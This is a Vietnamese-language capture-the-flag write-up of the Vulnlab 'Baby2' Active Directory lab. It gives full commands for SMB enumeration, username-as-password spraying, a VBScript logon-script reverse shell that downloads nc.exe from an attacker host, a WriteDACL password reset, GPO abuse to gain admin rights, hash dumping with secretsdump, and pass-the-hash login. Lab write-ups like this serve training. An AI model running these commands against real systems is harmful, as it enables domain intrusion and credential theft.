---
title: WRITE-UP Vulnlab Baby2
date: 2024-9-30 09:00:01 +0700
categories: [write up, vulnlab, red team, oscp, window]
tags: [vulnlab]     # TAG names should always be lowercase
---

# Write-up Baby2 -Vulnlab
- Nmap 
```
sudo nmap -sC -sV -p1-20000 10.10.93.93 --min-rate=3000 -T4
```
![alt text](/assets/img/baby2/image.png)

day la lab AD vi port 88 mo 

- RECON SMB

```
crackmapexec smb target 10.10.93.93 -u 'guest' -p '' --shares //null search
```

![alt text](/assets/img/baby2/image-1.png)

ta co the null search duoc va doc duoc 

READ
* apps
* IPC$
* NETLOGON
* homes

WRITE
* homes

Gio xem la trong cac file share co gi nhe 

```
smbclient \\\\10.10.93.93\\apps
```

![alt text](/assets/img/baby2/image-2.png)

sau khi check t duoc 1 ma hex

![alt text](/assets/img/baby2/image-3.png)

co ve ko co gi check tiep 

```
smbclient \\\\10.10.93.93\\homes
```

![alt text](/assets/img/baby2/image-4.png)

co ve day se cho ta 1 list user

![alt text](/assets/img/baby2/image-5.png)

brute-force xem lieu chung ta co the lam gi duoc voi nhung user nay k su dung user:user

```
crackmapexec smb target 10.10.93.93 -u user -p user --continue-on-success
```

sau khi brute-force ta co duoc 2 user 


baby2.vl\Carl.Moore:Carl.Moore

baby2.vl\library:library

![alt text](/assets/img/baby2/image-6.png)

![alt text](/assets/img/baby2/image-7.png)

sau khi login ta co the doc duoc doc xem no xem co gi khong

READ 
* docs
* SYSVOL

```
smbclient \\\\10.10.93.93\\docs -U Carl.Moore --password='Carl.Moore'
smbclient \\\\10.10.93.93\\SYSVOL -U Carl.Moore --password='Carl.Moore'
```
![alt text](/assets/img/baby2/image-8.png)
![alt text](/assets/img/baby2/image-9.png)

sau khi check thi ta thay co 1 file cho phep tao o dia va truyen file qua lai trong server dan macro 
vi vay ta co the tao reverse o day

```
Set oShell = CreateObject("Wscript.Shell")
oShell.run "cmd.exe /c mkdir C:\Temp"
oShell.run "cmd.exe /c certutil -urlcache -f http://10.8.3.170:8888/nc.exe C:\Temp\nc.exe"
oShell.run "cmd.exe /c C:\Temp\nc.exe 10.8.3.170 443 -e cmd.exe"

```

![alt text](/assets/img/baby2/image-11.png)
![alt text](/assets/img/baby2/image-10.png)

vay la t co the control duoc user ```baby2\amelia.griffiths```

den gio thi khong co huong phat trien tiep vi vay ta se phat trien tiep su dung bloodhound

```
bloodhound-python -d 'baby2.vl' -u 'Carl.Moore' -p 'Carl.Moore' -c all -ns 10.10.93.93 --zip
```

![alt text](/assets/img/baby2/image-12.png)

![alt text](/assets/img/baby2/image-14.png)

ta thay la user cua ta co the ```WRITEDACL``` toi ```GPOadm```
ta import powerview de co the chay nhie command hon

```
certutil -urlcache -f http://10.8.3.170:8888/powerview.ps1 powerview.ps1
import-module ./powerview.ps1
```

![alt text](/assets/img/baby2/image-13.png)

vi ta co quyen WriteDACL len GPO vi vay ta co the doi mat khau cua ```gpoadm```

```
Add-DomainObjectAcl -Rights "all" -TargetIdentity "gpoadm" -PrincipalIdentity "Amelia.Griffiths"

$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

set-domainuserpassword gpoadm -accountpassword $cred
```

sau khi doi mat khau cua ```gpoadm``` thi ta thay la thang ```gpoadm``` co quyen ```generic all``` cho phep abuse den ```domain controler``` 

thi ben trong huong dan cua thang bloodhound keu su dung tool ```pygpoabuse``` de abuse ```gpoadm``` to administrator

```
python3 pygpoabuse.py baby2.vl/gpoadm:Password123! -gpo-id 6AC1786C-016F-11D2-945F-00C04FB984F9 -dc-ip 10.10.93.93 -command 'net localgroup administrators /add gpoadm'
```
![alt text](/assets/img/baby2/image-15.png)

sau khi abuse thi de join vao may thi can mat khau ```SAM``` cua may cai nay thi thang ```impacket-secretdump``` lam dc 

```
impacket-secretsdump baby2.vl/gpoadm:'Password123!'@10.10.93.93
```

![alt text](/assets/img/baby2/image-16.png)

login with hash password dump duoc voi ```evil-winrm```

![alt text](/assets/img/baby2/image-17.png)

Now we are root :3